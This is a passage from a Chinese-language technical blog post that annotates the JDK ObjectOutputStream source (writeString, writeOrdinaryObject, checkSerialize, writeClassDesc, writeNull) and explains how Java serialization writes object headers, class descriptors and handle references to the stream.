8 字节长度（&gt; 0xFFFF）+ UTF 字节</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 说明：</span></span><br><span class="line"><span class="comment"> * - 这里的“UTF”是 Java 序列化/ DataOutput 使用的 **修改版 UTF-8（MUTF-8）**，其长度不是字符数，</span></span><br><span class="line"><span class="comment"> *   而是编码后的字节数（例如 U+0000 会编码为 0xC0 0x80）。</span></span><br><span class="line"><span class="comment"> * - `unshared == true` 时，该对象按“非共享（unshared）”语义写出：不会被放入句柄查表用于后续 TC_REFERENCE 回引；</span></span><br><span class="line"><span class="comment"> *   但仍会消耗一个句柄位以维持对象图的一致性。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeString</span><span class="params">(String str, <span class="type">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 为即将写出的对象“分配一个句柄编号”。当 unshared 为 true 时，传入 null，</span></span><br><span class="line">    <span class="comment">// 表示不把这个对象登记进句柄查找表（后续不能通过 TC_REFERENCE 回指到它）。</span></span><br><span class="line">    <span class="comment">// 为 false 时，登记该字符串实例，使后续重复出现时可以写 TC_REFERENCE 节省体积。</span></span><br><span class="line">    handles.assign(unshared ? <span class="literal">null</span> : str);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 预先计算按 MUTF-8 编码后的字节长度（可能大于 str.length()），返回 long 以避免长度溢出。</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">utflen</span> <span class="operator">=</span> bout.getUTFLength(str);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据长度选择写入格式：</span></span><br><span class="line">    <span class="comment">// - &lt;= 0xFFFF： TC_STRING（0x74） + 2 字节长度 + UTF 数据</span></span><br><span class="line">    <span class="comment">// -  &gt; 0xFFFF： TC_LONGSTRING（0x7C） + 8 字节长度 + UTF 数据</span></span><br><span class="line">    <span class="keyword">if</span> (utflen &lt;= <span class="number">0xFFFF</span>) &#123;</span><br><span class="line">        bout.writeByte(TC_STRING);</span><br><span class="line">        <span class="comment">// writeUTF 会写入 2 字节长度（与 utflen 匹配）+ 实际 UTF 字节</span></span><br><span class="line">        bout.writeUTF(str, utflen);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        bout.writeByte(TC_LONGSTRING);</span><br><span class="line">        <span class="comment">// writeLongUTF 会写入 8 字节长度 + 实际 UTF 字节</span></span><br><span class="line">        bout.writeLongUTF(str, utflen);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="writeOrdinaryObject"><a href="#writeOrdinaryObject" class="headerlink" title="writeOrdinaryObject"></a>writeOrdinaryObject</h3><p>现在我们重点来看看 <code>writeOrdinaryObject</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 写出一个“普通的”可序列化对象到流中。</span></span><br><span class="line"><span class="comment"> * “普通”是相对以下几类而言：它既不是 String、也不是 Class、也不是</span></span><br><span class="line"><span class="comment"> * ObjectStreamClass、也不是数组（array）、也不是枚举常量（enum）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 线上二进制大致结构（概念示意）：</span></span><br><span class="line"><span class="comment"> *   TC_OBJECT</span></span><br><span class="line"><span class="comment"> *   &lt;classDesc 或其 TC_REFERENCE&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;instanceData&gt;  // 由 writeSerialData 或 writeExternalData 负责</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 说明：</span></span><br><span class="line"><span class="comment"> * - 对象头使用结构化标记 TC_OBJECT（0x73）。</span></span><br><span class="line"><span class="comment"> * - “类描述”（classDesc）可能是：</span></span><br><span class="line"><span class="comment"> *      * 首次出现：完整的 TC_CLASSDESC / TC_PROXYCLASSDESC；</span></span><br><span class="line"><span class="comment"> *      * 已出现过：通过 TC_REFERENCE 回引到之前的类描述。</span></span><br><span class="line"><span class="comment"> * - 实例数据写出路径：</span></span><br><span class="line"><span class="comment"> *      * Externalizable 且非代理类(proxy)：走 writeExternalData（对象自定义 writeExternal）。</span></span><br><span class="line"><span class="comment"> *      * 否则：走 writeSerialData（默认/自定义 writeObject、默认字段等）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeOrdinaryObject</span><span class="params">(Object obj,</span></span><br><span class="line"><span class="params">                                 ObjectStreamClass desc,</span></span><br><span class="line"><span class="params">                                 <span class="type">boolean</span> unshared)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// （可选）为调试增强：把“当前正在写出的对象”压入调试栈，便于异常时展示写入路径。</span></span><br><span class="line">    <span class="comment">// depth == 1 表示本次 writeObject0 的“根对象”，加上 &quot;root &quot; 标签更易读。</span></span><br><span class="line">    <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">        debugInfoStack.push(</span><br><span class="line">            (depth == <span class="number">1</span> ? <span class="string">&quot;root &quot;</span> : <span class="string">&quot;&quot;</span>) + <span class="string">&quot;object (class \&quot;&quot;</span> +</span><br><span class="line">            obj.getClass().getName() + <span class="string">&quot;\&quot;, &quot;</span> + obj.toString() + <span class="string">&quot;)&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 1) 序列化前置校验：</span></span><br><span class="line">        <span class="comment">//    - 检查该类是否满足被序列化的先决条件（实现 Serializable / Externalizable 等）。</span></span><br><span class="line">        <span class="comment">//    - 对 Externalizable 类，还会检查无参 public 构造器等要求。</span></span><br><span class="line">        <span class="comment">//    - 不满足时抛出 NotSerializableException。</span></span><br><span class="line">        desc.checkSerialize();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) 写对象头标记：TC_OBJECT（结构化标记，必须在“非块模式”下写出）。</span></span><br><span class="line">        bout.writeByte(TC_OBJECT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) 写“类描述符”（class descriptor）：</span></span><br><span class="line">        <span class="comment">//    - 可能写入完整的描述（TC_CLASSDESC/TC_PROXYCLASSDESC），包含 SUID、字段签名等；</span></span><br><span class="line">        <span class="comment">//    - 也可能写一个对前述描述的句柄引用（TC_REFERENCE），若该类描述已写过。</span></span><br><span class="line">        <span class="comment">//    - 这里第二个参数传 false：类描述本身始终按“可共享”语义处理（允许后续引用）。</span></span><br><span class="line">        writeClassDesc(desc, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4) 为当前“实例对象”分配句柄（handle）以支持后续的共享/回引：</span></span><br><span class="line">        <span class="comment">//    - unshared == true：传入 null，表示本对象不登记到句柄表（后续不能 TC_REFERENCE 到它），</span></span><br><span class="line">        <span class="comment">//      但实现会维持协议上的句柄计数一致性（readUnshared 语义依赖该一致性）。</span></span><br><span class="line">        <span class="comment">//    - unshared == false：登记该对象，使得对象图中的别名关系可通过 TC_REFERENCE 保持。</span></span><br><span class="line">        handles.assign(unshared ? <span class="literal">null</span> : obj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5) 根据类型特性选择写实例数据的路径：</span></span><br><span class="line">        <span class="keyword">if</span> (desc.isExternalizable() &amp;&amp; !desc.isProxy()) &#123;</span><br><span class="line">            <span class="comment">// 5.a Externalizable（且不是动态代理类）：</span></span><br><span class="line">            <span class="comment">//     - 直接调用对象的 writeExternal(ObjectOutput) 把“自定义二进制”写出去。</span></span><br><span class="line">            <span class="comment">//     - 在默认协议版本（PROTOCOL_VERSION_2）下，会用 BLOCKDATA（TC_BLOCKDATA/TC_BLOCKDATALONG）</span></span><br><span class="line">            <span class="comment">//       进行包裹，确保接收端能一次性读取到该 external 内容块；</span></span><br><span class="line">            <span class="comment">//     - 若显式使用旧协议版本（useProtocolVersion(PROTOCOL_VERSION_1)），</span></span><br><span class="line">            <span class="comment">//       则按旧格式（可能无需块包裹）写出。</span></span><br><span class="line">            writeExternalData((Externalizable) obj);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 5.b 常规 Serializable 对象：</span></span><br><span class="line">            <span class="comment">//     - 写出实例数据（包含父类层级上非 transient/非 static 的字段）；</span></span><br><span class="line">            <span class="comment">//     - 若类自定义了 writeObject/readObject，会在此触发；</span></span><br><span class="line">            <span class="comment">//     - 写字段值时通常会切换到“块数据模式”，以 TC_BLOCKDATA* 包裹原始字段写入，</span></span><br><span class="line">            <span class="comment">//       从而减少标记开销并保持读写对齐。</span></span><br><span class="line">            writeSerialData(obj, desc);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 6) 异常与收尾：弹出调试栈，保持调试轨迹对称。</span></span><br><span class="line">        <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">            debugInfoStack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在写入 obj 对象之前，代码会先调用 <code>checkSerialize()</code> 检查当前对象是否是一个可序列化对象，如果不是那么会终止本次序列化并抛出 <code>newInvalidClassException()</code> 错误：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 检查“该类的实例”是否**允许被序列化**；若不允许，则抛出 InvalidClassException。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 设计要点：</span></span><br><span class="line"><span class="comment"> * 1) ObjectStreamClass（类描述符，简称 OSC）在构建/初始化阶段，会对目标类做一系列校验，</span></span><br><span class="line"><span class="comment"> *    如果发现**不满足序列化前置条件**或**默认序列化存在结构性问题**，就把原因封装进</span></span><br><span class="line"><span class="comment"> *    `serializeEx`（ExceptionInfo）里。</span></span><br><span class="line"><span class="comment"> * 2) 本方法在真正写对象数据前被调用：若此前已记录“不能序列化”的原因，就转化并抛出</span></span><br><span class="line"><span class="comment"> *    InvalidClassException（其中包含类名与详细原因）。</span></span><br><span class="line"><span class="comment"> * 3) 注意：该检查**不适用于枚举常量**的写出（enum 走专门的分支处理）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 典型会设置 `serializeEx` 的情形（不同 JDK 版本细节略有差异）举例：</span></span><br><span class="line"><span class="comment"> * - 声明的可持久化字段元信息非法：例如 `serialPersistentFields`/字段排列不合法，</span></span><br><span class="line"><span class="comment"> *   `computeFieldOffsets()` 在构建字段布局时抛出 InvalidClassException；此时初始化逻辑会</span></span><br><span class="line"><span class="comment"> *   将异常原因记录到 `serializeEx`（常见源码写法：`serializeEx = new ExceptionInfo(...);`）。 </span></span><br><span class="line"><span class="comment"> * - 其他类层面约束不满足（如某些平台/版本下对 Externalizable/record/value class 的限制等），</span></span><br><span class="line"><span class="comment"> *   也会在初始化阶段把原因放入 `serializeEx`，从而触发这里的抛出。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 先决条件：</span></span><br><span class="line"><span class="comment"> * - 必须确保本描述符已完成初始化；否则视为内部使用异常（请见下方 `requireInitialized()`）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InvalidClassException 若该类的对象不允许被序列化</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">checkSerialize</span><span class="params">()</span> <span class="keyword">throws</span> InvalidClassException &#123;</span><br><span class="line">    <span class="comment">// 防御式：若描述符尚未完成初始化，属于协议/实现时序问题（内部错误）</span></span><br><span class="line">    requireInitialized();</span><br><span class="line">    <span class="comment">// 若初始化阶段已记录“不能序列化”的原因，这里将其抛出为 InvalidClassException</span></span><br><span class="line">    <span class="keyword">if</span> (serializeEx != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> serializeEx.newInvalidClassException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 断言当前 ObjectStreamClass **已完成初始化**；否则抛出 InternalError。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 作用：</span></span><br><span class="line"><span class="comment"> * - OSC 的很多行为依赖于“初始化阶段”收集到的元信息（可否序列化/字段布局/构造器/钩子等）。</span></span><br><span class="line"><span class="comment"> *   若在初始化未完成时就调用某些方法，说明上层用法或流状态有问题，需要立即失败。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 典型触发途径：</span></span><br><span class="line"><span class="comment"> * - 协议读取/构建描述符尚未完结就提前使用；</span></span><br><span class="line"><span class="comment"> * - 本地通过 `lookup(...)` 等路径拿到的描述符还未完成内部校验/装配。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 异常类型：</span></span><br><span class="line"><span class="comment"> * - 这里抛的是 `InternalError`（运行时错误），属于实现不变量被破坏的信号；</span></span><br><span class="line"><span class="comment"> *   与“业务/协议错误”的 `InvalidClassException` 有所区分。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">requireInitialized</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!initialized)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InternalError</span>(<span class="string">&quot;Unexpected call when not initialized&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果是一个可序列化对象，那么会开始写入 <code>TC_OBJECT</code> 标记（表示开始）</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2) 写对象头标记：TC_OBJECT（结构化标记，必须在“非块模式”下写出）。</span></span><br><span class="line">bout.writeByte(TC_OBJECT);</span><br></pre></td></tr></table></figure></div>

<p>随后调用 <code>writeClassDesc</code> 方法写入当前对象所属类的类描述信息：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3) 写“类描述符”（class descriptor）：</span></span><br><span class="line"><span class="comment">//    - 可能写入完整的描述（TC_CLASSDESC/TC_PROXYCLASSDESC），包含 SUID、字段签名等；</span></span><br><span class="line"><span class="comment">//    - 也可能写一个对前述描述的句柄引用（TC_REFERENCE），若该类描述已写过。</span></span><br><span class="line"><span class="comment">//    - 这里第二个参数传 false：类描述本身始终按“可共享”语义处理（允许后续引用）。</span></span><br><span class="line">writeClassDesc(desc, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure></div>

<p>如果使用的模式是 <code>unshared</code> 模式，则将 <code>desc</code> 所表示的类元数据信息插入到 <code>handles</code> 对象的映射表中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 4) 为当前“实例对象”分配句柄（handle）以支持后续的共享/回引：</span></span><br><span class="line"><span class="comment">//    - unshared == true：传入 null，表示本对象不登记到句柄表（后续不能 TC_REFERENCE 到它），</span></span><br><span class="line"><span class="comment">//      但实现会维持协议上的句柄计数一致性（readUnshared 语义依赖该一致性）。</span></span><br><span class="line"><span class="comment">//    - unshared == false：登记该对象，使得对象图中的别名关系可通过 TC_REFERENCE 保持。</span></span><br><span class="line">handles.assign(unshared ? <span class="literal">null</span> : obj);</span><br></pre></td></tr></table></figure></div>

<p>最后会判断当前 Java 对象的序列化语义：</p>
<ul>
<li>如果当前对象不是一个<strong>动态代理类</strong>并且是实现了<strong>外部化</strong>的，则调用 <code>writeExternalData</code> 方法写入对象信息；</li>
<li>如果当前对象是一个实现了 <code>Serializable</code> 接口的，则调用 <code>writeSerialData</code> 方法写入对象信息。</li>
</ul>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 5) 根据类型特性选择写实例数据的路径：</span></span><br><span class="line"><span class="keyword">if</span> (desc.isExternalizable() &amp;&amp; !desc.isProxy()) &#123;</span><br><span class="line">    <span class="comment">// 5.a Externalizable（且不是动态代理类）：</span></span><br><span class="line">    <span class="comment">//     - 直接调用对象的 writeExternal(ObjectOutput) 把“自定义二进制”写出去。</span></span><br><span class="line">    <span class="comment">//     - 在默认协议版本（PROTOCOL_VERSION_2）下，会用 BLOCKDATA（TC_BLOCKDATA/TC_BLOCKDATALONG）</span></span><br><span class="line">    <span class="comment">//       进行包裹，确保接收端能一次性读取到该 external 内容块；</span></span><br><span class="line">    <span class="comment">//     - 若显式使用旧协议版本（useProtocolVersion(PROTOCOL_VERSION_1)），</span></span><br><span class="line">    <span class="comment">//       则按旧格式（可能无需块包裹）写出。</span></span><br><span class="line">    writeExternalData((Externalizable) obj);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 5.b 常规 Serializable 对象：</span></span><br><span class="line">    <span class="comment">//     - 写出实例数据（包含父类层级上非 transient/非 static 的字段）；</span></span><br><span class="line">    <span class="comment">//     - 若类自定义了 writeObject/readObject，会在此触发；</span></span><br><span class="line">    <span class="comment">//     - 写字段值时通常会切换到“块数据模式”，以 TC_BLOCKDATA* 包裹原始字段写入，</span></span><br><span class="line">    <span class="comment">//       从而减少标记开销并保持读写对齐。</span></span><br><span class="line">    writeSerialData(obj, desc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="writeClassDesc"><a href="#writeClassDesc" class="headerlink" title="writeClassDesc"></a>writeClassDesc</h3><p><code>writeClassDesc</code> 方法主要用于判断当前的类描述符使用什么方式写入：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将“类描述符”（ObjectStreamClass，简称 OSC）的表示写入到序列化流中。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 类描述符用于告诉对端：这个类如何被序列化/反序列化（类名、SUID、标志位、字段列表、</span></span><br><span class="line"><span class="comment"> * 是否有 writeObject/readObject、是否 Externalizable、父类描述符等）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 协议相关（写入时会使用到的结构化标记，供理解）：</span></span><br><span class="line"><span class="comment"> * - TC_NULL(0x70)            ：空引用</span></span><br><span class="line"><span class="comment"> * - TC_REFERENCE(0x71)       ：句柄回引（后随 4 字节句柄 ID）</span></span><br><span class="line"><span class="comment"> * - TC_CLASSDESC(0x72)       ：“非代理类”的类描述符</span></span><br><span class="line"><span class="comment"> * - TC_PROXYCLASSDESC(0x7D)  ：“动态代理类（java.lang.reflect.Proxy）”的类描述符</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 关于 unshared：</span></span><br><span class="line"><span class="comment"> * - 当作为“独立对象”写出 ObjectStreamClass 本身时，可能会传入 true（走 writeUnshared 语义）。</span></span><br><span class="line"><span class="comment"> * - 当作为“某对象的类描述”被写出时，调用点一般传 false（类描述应可被共享/回引，以避免重复写入）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeClassDesc</span><span class="params">(ObjectStreamClass desc, <span class="type">boolean</span> unshared)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> handle;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (desc == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 情况 A：没有类描述符（空）→ 写 TC_NULL</span></span><br><span class="line">        writeNull();</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (handle = handles.lookup(desc)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 情况 B：允许共享，且该 OSC 之前已经写出过</span></span><br><span class="line">        <span class="comment">//       → 使用句柄回引：写 TC_REFERENCE + 4 字节句柄 ID，避免重复完整输出</span></span><br><span class="line">        writeHandle(handle);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (desc.isProxy()) &#123;</span><br><span class="line">        <span class="comment">// 情况 C：该类是“动态代理类”（由 Proxy 生成）</span></span><br><span class="line">        <span class="comment">//       → 写入代理类描述符（TC_PROXYCLASSDESC），内部会写接口名列表、注解等信息，</span></span><br><span class="line">        <span class="comment">//         并在末尾跟随其父类描述符（通常是 Object）的处理</span></span><br><span class="line">        writeProxyDesc(desc, unshared);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 情况 D：普通（非代理）类</span></span><br><span class="line">        <span class="comment">//       → 写入非代理类描述符（TC_CLASSDESC），包含：</span></span><br><span class="line">        <span class="comment">//         * 类名、serialVersionUID</span></span><br><span class="line">        <span class="comment">//         * 类标志（如 SC_SERIALIZABLE、SC_EXTERNALIZABLE、SC_WRITE_METHOD 等）</span></span><br><span class="line">        <span class="comment">//         * 字段描述数组（类型签名、字段名）</span></span><br><span class="line">        <span class="comment">//         * 若有自定义 writeObject/readObject 将以标志体现</span></span><br><span class="line">        <span class="comment">//         * “注解块”（以块数据写的自定义元数据，通常为空）</span></span><br><span class="line">        <span class="comment">//         * 父类的类描述符（递归同样的规则）</span></span><br><span class="line">        writeNonProxyDesc(desc, unshared);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>如果传入的类描述信息是一个 <code>null</code> 引用，那么会调用 <code>writeNull</code> 方法；</li>
<li>如果没有使用 <code>unshared</code> 方式，并且可以在 <code>handles</code> 对象池中找到传入的对象信息，那么调用<code>writeHandle</code>；</li>
<li>如果传入的类是一个动态代理类，那么调用 <code>writeProxyDesc</code> 方法；</li>
<li>如果上面三个条件都不满足，那么调用 <code>writeNonProxyDesc</code> 方法。</li>
</ul>
<p><code>writeNull</code> 就是向序列化流中写入一个“空引用”标记。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 向序列化流写入“空引用”标记。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 协议语义：</span></span><br><span class="line"><span class="comment"> * - 使用结构化标记 TC_NULL (0x70) 表示一个对象位置上出现了 null。</span></span><br><span class="line"><span class="comment"> * - 常见出现位置：对象引用字段为 null、类描述符的父类为 null（到达 java.lang.Object）等。</span></span><br><span class="line"><span class="comment"> * - 这是“结构化标记”，通常在**非块数据模式**下写出（调用点会负责切换）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * I/O 细节：</span></span><br><span class="line"><span class="comment"> * - 通过 DataOutput 写单字节，按 Java 序列化协议的有序字节流输出。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeNull</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    bout.writeByte(TC_NULL); <span class="comment">// 0x70</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>writeHandle</code> 则是在当前对象允许引用的时候，写入该对象在本地句柄表（<code>handles</code>）的下标信息。</p>
<p>具体来说是写入结构化标记 <code>TC_REFERENCE</code> (0x71) 后跟 4 字节网络句柄 ID。这里网络句柄 ID 对应本地句柄表（<code>handles</code>）的下标。</p>
